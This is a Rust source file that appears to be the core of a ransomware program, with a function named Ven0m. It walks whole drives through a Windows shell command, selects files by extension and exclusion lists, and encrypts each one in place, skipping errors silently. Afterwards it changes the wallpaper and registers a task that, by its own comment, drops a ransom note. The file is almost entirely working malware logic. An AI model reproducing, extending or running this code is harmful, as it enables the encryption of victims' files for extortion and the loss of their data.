use anyhow::{Result, Context};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::io::{BufReader, BufRead};

use crate::core;
use crate::encrypt;
use crate::wallpaper;
use crate::task;


// Ransomware Main
pub fn Ven0m(drvs: &[&str], KEY: &[u8; 32], XCL: &[&str], XT: &[&str]) -> Result<()> {

for drv in drvs {
    let mut output = Command::new("cmd")
        .args(["/c", "dir", "/s", "/b", drv])
        .stdout(Stdio::piped())
        .spawn()?;

    let reader = BufReader::new(output.stdout.take().context("[!] Failed to capture stdio!")?);
    for line in reader.lines() {
        let path = PathBuf::from(line?);
        let result: Result<()> = (|| {

            // Check extentions
            if core::extention_filter(&[path.clone()], XT)?.is_empty() {
                return Ok(());
            }
            // Check exclusions
            if core::exclusion_filter(&[path.clone()], XCL)?.is_empty() {
                return Ok(());
               }

            println!(" -> Encrypting: {}", path.display());
            encrypt::encrypt(&path, KEY)?;

        Ok(())
                
        })();
                    // Silently continue if error
            if let Err(e) = result {
                println!("[!] Skipping {}: {}", path.display(), e);
                }
    }

    output.wait()?;

}
    // Changing the wallpaper and dropping the ransom note >:)
    wallpaper::set_wallpaper()?;
    task::register()?;
    
    Ok(())
}



